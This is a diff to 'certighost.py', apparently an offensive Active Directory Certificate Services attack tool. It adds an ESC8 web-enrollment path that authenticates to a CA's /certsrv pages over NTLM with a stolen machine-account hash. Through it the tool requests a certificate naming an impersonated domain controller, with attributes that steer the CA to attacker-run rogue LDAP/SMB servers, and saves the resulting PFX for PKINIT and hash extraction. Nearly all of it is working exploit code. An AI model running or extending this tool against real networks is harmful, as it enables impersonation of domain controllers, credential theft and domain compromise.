@@ -3,8 +3,8 @@
 # Authors: @h0j3n, @aniqfakhrul
 #
 # python3 certighost.py -d <domain> -u <user> -p <pass> --dc-ip <ip>
-import argparse, calendar, logging, os, random, secrets, signal, traceback
-import socket, string, struct, sys, threading, time
+import argparse, base64, calendar, logging, os, random, secrets, signal, traceback
+import re, socket, string, struct, sys, threading, time
 from binascii import unhexlify
 from datetime import datetime, timedelta, timezone
 from pathlib import Path
@@ -869,6 +869,118 @@ def pkinit_and_hash(pfx_data, username, domain, dc_ip):
 
 MSRPC_UUID_ICPR = uuidtup_to_bin(("91ae6020-9e3c-11cf-8d7c-00aa00c091be", "0.0"))
 
+
+def _ntlm_http_request(conn, method, path, body, headers, domain, comp_name, comp_hash):
+    """One NTLM-authenticated HTTP exchange on a persistent connection:
+    Type1 -> 401/Type2 -> Type3+real request. IIS integrated auth requires
+    the handshake on the same TCP connection; repeat it per connection."""
+    t1 = ntlm.getNTLMSSPType1(workstation=comp_name.rstrip('$'), domain=domain)
+    h1 = dict(headers)
+    h1["Authorization"] = "NTLM " + base64.b64encode(t1.getData()).decode()
+    conn.request(method, path, body=body, headers=h1)
+    resp = conn.getresponse()
+    chal = resp.getheader("WWW-Authenticate") or ""
+    resp.read()  # drain so the connection can carry the second leg
+    if resp.status != 401 or "NTLM" not in chal.upper():
+        raise RuntimeError(f"CA HTTP: expected 401 NTLM challenge, got {resp.status} (WWW-Authenticate: {chal or 'none'})")
+    t2 = base64.b64decode(chal.split("NTLM", 1)[1].strip())  # raw bytes: getNTLMSSPType3 parses internally
+    # impacket convention (cf. rpcrt.set_credentials): NT hashes are unhexlified bytes
+    nt_bytes = unhexlify(comp_hash)
+    t3, _sess_key = ntlm.getNTLMSSPType3(t1, t2, comp_name, "", domain, "", nt_bytes)
+    h2 = dict(headers)
+    h2["Authorization"] = "NTLM " + base64.b64encode(t3.getData()).decode()
+    conn.request(method, path, body=body, headers=h2)
+    resp2 = conn.getresponse()
+    return resp2.read().decode("utf-8", errors="replace"), resp2.status
+
+
+def probe_ca_http(ca_ip, ca_name, timeout=6, http_port=80):
+    """ESC8 pre-flight: is certsrv listening and speaking NTLM on TCP/80?"""
+    import http.client
+    try:
+        conn = http.client.HTTPConnection(ca_ip, http_port, timeout=timeout)
+        conn.request("GET", "/certsrv/")
+        resp = conn.getresponse()
+        www_auth = resp.getheader("WWW-Authenticate") or ""
+        resp.read()
+        conn.close()
+    except Exception as exc:
+        print(f"[!] CA HTTP probe failed: cannot reach TCP/80 on {ca_ip} ({exc})")
+        print("    - Wrong --ca-ip, or web enrollment port blocked")
+        sys.exit(1)
+    if resp.status == 401 and "NTLM" in www_auth.upper():
+        print(f"[*] Web enrollment (certsrv) is live on {ca_ip} — ESC8 confirmed")
+        return
+    if resp.status == 404:
+        print(f"[!] HTTP probe failed: /certsrv/ not found on {ca_ip}")
+        print("    Web enrollment (ESC8) is NOT installed on this CA — use the DCOM path (drop --http)")
+        sys.exit(1)
+    print(f"[!] HTTP probe inconclusive: /certsrv/ returned {resp.status} "
+          f"(WWW-Authenticate: {www_auth or 'none'}) — continuing, request may fail")
+
+
+def request_cert_http(ca_ip, domain, comp_name, comp_hash, dc_ip,
+                      atk_ip, rmd_value, template="Machine", timeout=15, http_port=80):
+    """Submit the same request via the CA's web enrollment (ESC8) frontend.
+
+    Same semantics as request_cert(): same CSR (chased rmd SAN), same request
+    attributes (CertificateTemplate + SAN + cdc: + rmd:) that trigger the
+    CA-side chase to the rogue LDAP/SMB — but delivered through
+    /certsrv/certfnsh.asp with NTLM machine-account auth over HTTP,
+    bypassing DCOM/ICPR entirely (for CAs where ICPR fails with
+    rpc_s_access_denied). Form spec per impacket's ntlmrelayx ADCSAttack."""
+    import http.client
+    import urllib.parse
+    key = rsa_mod.generate_private_key(65537, 2048)
+    hostname = f"{comp_name.rstrip('$')}.{domain}"
+    # Request SAN identity = impersonated target DC's DNS name, same as DCOM path
+    csr = (x509.CertificateSigningRequestBuilder()
+           .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, hostname)]))
+           .add_extension(x509.SubjectAlternativeName([x509.DNSName(rmd_value)]), critical=False)
+           .sign(key, hashes.SHA256()))
+    # certsrv form encoding, byte-for-byte per impacket ntlmrelayx ADCSAttack:
+    # PEM with newlines stripped, '+' pre-encoded as %2b, spaces as '+',
+    # attributes with CRLF pre-encoded as %0d%0a. No generic urlencode —
+    # classic ASP form decoding conventions.
+    csr_form = (csr.public_bytes(Encoding.PEM).decode()
+                .replace("\n", "").replace("+", "%2b").replace(" ", "+"))
+    cert_attrib = (f"CertificateTemplate:{template}%0d%0aSAN:dns={rmd_value}%0d%0a"
+                   f"cdc:{atk_ip}%0d%0armd:{rmd_value}")
+    data = ("Mode=newreq&CertRequest=%s&CertAttrib=%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint="
+            % (csr_form, cert_attrib))
+    headers = {"Content-Type": "application/x-www-form-urlencoded",
+               "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"}
+    conn = http.client.HTTPConnection(ca_ip, http_port, timeout=timeout)
+    _debug(f"CA HTTP: POST /certsrv/certfnsh.asp as {comp_name} "
+           f"(template={template}, cdc={atk_ip}, rmd={rmd_value!r})")
+    try:
+        body, status = _ntlm_http_request(conn, "POST", "/certsrv/certfnsh.asp",
+                                          data, headers, domain, comp_name, comp_hash)
+    finally:
+        conn.close()
+    if status != 200:
+        raise RuntimeError(f"CA HTTP: certfnsh.asp returned HTTP {status}")
+    found = re.findall(r'location="certnew\.cer\?ReqID=(.*?)&', body)
+    if not found:
+        err = re.search(r'Error[^<]{0,300}', body, re.I)
+        detail = err.group(0).strip() if err else body[:200]
+        raise RuntimeError(f"CA HTTP enrollment denied: {detail}")
+    req_id = found[0]
+    _debug(f"CA HTTP: ReqID={req_id} — retrieving certificate")
+    conn2 = http.client.HTTPConnection(ca_ip, http_port, timeout=timeout)
+    try:
+        body2, status2 = _ntlm_http_request(conn2, "GET",
+                                            f"/certsrv/certnew.cer?ReqID={req_id}",
+                                            None, headers, domain, comp_name, comp_hash)
+    finally:
+        conn2.close()
+    if status2 != 200 or "-----BEGIN CERTIFICATE-----" not in body2:
+        raise RuntimeError(f"CA HTTP: certnew.cer returned HTTP {status2} without a certificate")
+    cert_pem = body2[body2.index("-----BEGIN CERTIFICATE-----"):]
+    cert = x509.load_pem_x509_certificate(cert_pem.encode())
+    pfx = pkcs12.serialize_key_and_certificates(b"", key, cert, None, NoEncryption())
+    return pfx
+
 class CERTTRANSBLOB(NDRSTRUCT):
     structure = (("cb", ULONG), ("pb", PBYTE))
 
@@ -1122,6 +1234,9 @@ def main():
     cred.add_argument("--computer-pass", help="Existing computer password")
     cred.add_argument("--computer-hash", help="Existing computer NT hash")
     p.add_argument("--use-ldap", action="store_true", help="Use LDAP (389) instead of LDAPS (636)")
+    p.add_argument("--http", action="store_true",
+                   help="Submit the cert request via web enrollment /certsrv (ESC8) instead of DCOM/ICPR — "
+                        "for CAs where ICPR fails with rpc_s_access_denied")
     p.add_argument("--debug", action="store_true",
                    help="Show protocol stages, decoded errors and full tracebacks")
     args = p.parse_args()
@@ -1185,8 +1300,12 @@ def main():
 
     # Pre-flight CA check before starting rogue servers: fail fast (~1s)
     # instead of failing after SMB/LDAP startup + EPM queries (~15s in).
-    print(f"[*] Probing CA {ca_name} at {ca_ip} (ICPR endpoint)")
-    probe_ca(ca_ip, ca_name, domain, dc_ip)
+    if args.http:
+        print(f"[*] Probing CA {ca_name} at {ca_ip} (web enrollment, TCP/80)")
+        probe_ca_http(ca_ip, ca_name)
+    else:
+        print(f"[*] Probing CA {ca_name} at {ca_ip} (ICPR endpoint)")
+        probe_ca(ca_ip, ca_name, domain, dc_ip)
 
     target_name = args.target_san
     if not target_name:
@@ -1273,9 +1392,14 @@ def main():
         else:
             print("[!] Rogue servers failed to start"); sys.exit(1)
 
-        print(f"[*] Requesting certificate (template={args.template}, cdc={atk_ip})")
-        pfx_data = request_cert(ca_ip, ca_name, domain, comp_name, comp_hash,
-                                dc_ip, atk_ip, target_dns, args.template)
+        print(f"[*] Requesting certificate "
+              f"({'web enrollment/ESC8' if args.http else 'DCOM/ICPR'}, template={args.template}, cdc={atk_ip})")
+        if args.http:
+            pfx_data = request_cert_http(ca_ip, domain, comp_name, comp_hash,
+                                         dc_ip, atk_ip, target_dns, args.template)
+        else:
+            pfx_data = request_cert(ca_ip, ca_name, domain, comp_name, comp_hash,
+                                    dc_ip, atk_ip, target_dns, args.template)
         pfx_name = f"{target_name.rstrip('$').lower()}.pfx"
         Path(pfx_name).write_bytes(pfx_data)
         print(f"    Saved: {pfx_name}")
